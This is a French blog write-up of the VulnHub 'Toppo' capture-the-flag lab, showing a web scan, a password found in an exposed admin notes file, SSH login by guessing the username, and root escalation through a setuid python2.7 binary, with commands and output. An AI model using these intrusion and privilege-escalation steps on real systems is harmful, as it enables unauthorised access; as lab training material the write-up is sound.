---
title: "Solution du CTF Toppo de VulnHub"
tags: [CTF, VulnHub]
---

[Toppo](https://vulnhub.com/entry/toppo-1,245/) est un petit CTF créé par *Hadi Mene* et disponible sur *VulnHub*.

On trouve un port 22 et un port 80. Sur le site web, il n'y a réellement qu'un formulaire de contact. On peut avoir une version cURL de la requête via les dev-tools du navigateur :

```bash
curl 'http://192.168.56.172/mail/contact_me.php' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'Origin: http://192.168.56.172' \
  -H 'Pragma: no-cache' \
  -H 'Referer: http://192.168.56.172/contact.html' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36' \
  -H 'X-Requested-With: XMLHttpRequest' \
  --data-raw 'name=zozo&phone=0606060606&email=zozo%40zz.com&message=yop+yop'
```

On peut utiliser Wapiti pour attaquer cette URL :

```bash
wapiti -u http://192.168.56.172/mail/contact_me.php --data 'name=zozo&phone=0606060606&email=zozo%40zz.com&message=yop+yop' --scope page
```

Cela n'a rien donné.

Via une énumération, on trouve un dossier `/admin/` avec listing activé. Il y a dedans un fichier `notes.txt` avec le contenu suivant :

> Note to myself :
> I need to change my password :/ 12345ted123 is too outdated but the technology isn't my thing i prefer go fishing or watching soccer .

Pas de nom d'utilisateur ?

J'ai rejeté un œil au formulaire de contact et j'ai remarqué ça dans le code HTML :

```html
          <!-- Contact Form - Enter your email address on line 19 of the mail/contact_me.php file to make this form work. -->
          <!-- WARNING: Some web hosts do not allow emails to be sent through forms to common mail hosts like Gmail or Yahoo. It's recommended that you use a private domain email address! -->
          <!-- To use the contact form, your site must be on a live web host with PHP! The form will not work locally! -->
```

En recherchant cette histoire de ligne 19 je suis tombé sur ce projet Github où on retrouve aussi le PHP derrière le formulaire :

[filabs/contact_me.php at master · ficonsulting/filabs · GitHub](https://github.com/ficonsulting/filabs/blob/master/mail/contact_me.php)

Il n'y a rien qui semble vulnérable.

Finalement en regardant à nouveau le mot de passe je me dis que l'utilisateur pourrait bien être `ted` (les trois lettres au milieu) et effectivement je parviens à me connecter via SSH.

Une énumération des binaires setuid remonte quelques programmes inhabituels :

```console
ted@Toppo:/var/www/html$ find / -perm -u+s -ls 2> /dev/null 
  3795   96 -rwsr-xr-x   1 root     root        96760 Aug 13  2014 /sbin/mount.nfs
144123 1060 -rwsr-xr-x   1 root     root      1085300 Feb 10  2018 /usr/sbin/exim4
138907   12 -rwsr-xr-x   1 root     root         9468 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
144166  356 -rwsr-xr--   1 root     messagebus   362672 Nov 21  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
144700  552 -rwsr-xr-x   1 root     root       562536 Nov 19  2017 /usr/lib/openssh/ssh-keysign
130158   80 -rwsr-xr-x   1 root     root        78072 May 17  2017 /usr/bin/gpasswd
134258   40 -rwsr-xr-x   1 root     root        38740 May 17  2017 /usr/bin/newgrp
141007 3800 -rwsrwxrwx   1 root     root      3889608 Aug 13  2016 /usr/bin/python2.7
130156   44 -rwsr-xr-x   1 root     root        43576 May 17  2017 /usr/bin/chsh
143948   52 -rwsr-sr-x   1 daemon   daemon      50644 Sep 30  2014 /usr/bin/at
134156  108 -rwsr-xr-x   1 root     root       106908 Mar 23  2012 /usr/bin/mawk
130155   52 -rwsr-xr-x   1 root     root        52344 May 17  2017 /usr/bin/chfn
144729   96 -rwsr-sr-x   1 root     mail        96192 Nov 18  2017 /usr/bin/procmail
130159   52 -rwsr-xr-x   1 root     root        53112 May 17  2017 /usr/bin/passwd
   696   40 -rwsr-xr-x   1 root     root        38868 May 17  2017 /bin/su
  1698   28 -rwsr-xr-x   1 root     root        26344 Mar 29  2015 /bin/umount
  1697   36 -rwsr-xr-x   1 root     root        34684 Mar 29  2015 /bin/mount
```

On va ici utiliser Python pour augmenter nos privilèges :

```console
ted@Toppo:/var/www/html$ /usr/bin/python2.7
Python 2.7.9 (default, Aug 13 2016, 16:41:35) 
[GCC 4.9.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.setuid(0)
>>> os.setgid(0)
>>> import pty
>>> pty.spawn("/bin/bash")
root@Toppo:/var/www/html# cd /root
root@Toppo:/root# ls
flag.txt
root@Toppo:/root# cat flag.txt
_________                                  
|  _   _  |                                 
|_/ | | \_|.--.   _ .--.   _ .--.    .--.   
    | |  / .'`\ \[ '/'`\ \[ '/'`\ \/ .'`\ \ 
   _| |_ | \__. | | \__/ | | \__/ || \__. | 
  |_____| '.__.'  | ;.__/  | ;.__/  '.__.'  
                 [__|     [__|              

Congratulations ! there is your flag : 0wnedlab{p4ssi0n_c0me_with_pract1ce}
```


